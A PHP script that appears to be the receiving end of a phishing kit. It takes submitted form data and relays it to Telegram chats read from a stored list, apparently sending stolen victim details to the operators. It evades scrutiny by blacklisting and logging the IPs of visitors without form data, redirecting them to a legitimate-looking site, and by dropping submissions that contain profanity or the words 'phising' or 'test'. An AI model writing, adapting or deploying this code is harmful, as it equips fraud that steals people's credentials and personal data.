<?php
require_once('main.php');
if (preg_match("/".$ip."/i", file_get_contents('bot.txt'))) {
   exit(header("location:https://www.duitinaja.com/"));
}

if (isset($_POST['a']) && isset($_POST['b'])) {
   $subject = $_POST['a'];
   $message = str_replace('\r', "", $_POST['b']);
   $message = str_replace('\n', "", $message);
   $message_telegram = str_replace("<br>", "\n", $message);
   if (preg_match("/kontol/i", $subject) OR preg_match("/memek/i", $subject) OR preg_match("/anjing/i", $subject) OR preg_match("/pepek/i", $subject) OR preg_match("/kimak/i", $subject) OR preg_match("/pantek/i", $subject) OR preg_match("/nguyen/i", $subject) OR preg_match("/jembut/i", $subject) OR preg_match("/tolol/i", $subject) OR preg_match("/phising/i", $subject) OR preg_match("/bacot/i", $subject) OR preg_match("/babi/i", $subject) OR preg_match("/asucok/i", $subject) OR preg_match("/ngetes/i", $subject) OR preg_match("/test/i", $subject) OR preg_match("/testing/i", $subject)) {
      exit(header("location:https://www.duitinaja.com/"));
   }else{
      include 'panel/data.php';

      $read = file_get_contents('panel/data.json');
      $json = json_decode($read,true);
      for($i=0;$i<=count($json) - 1;$i++) {
         bot('sendmessage',['chat_id'=>$json[$i]['chat_id'],'text'=>$message_telegram,'parse_mode'=>'html',]);
      }
   }
}else{
   tulis_file("bot.txt", $ip);
   exit(header("location:https://www.duitinaja.com/"));
}
?>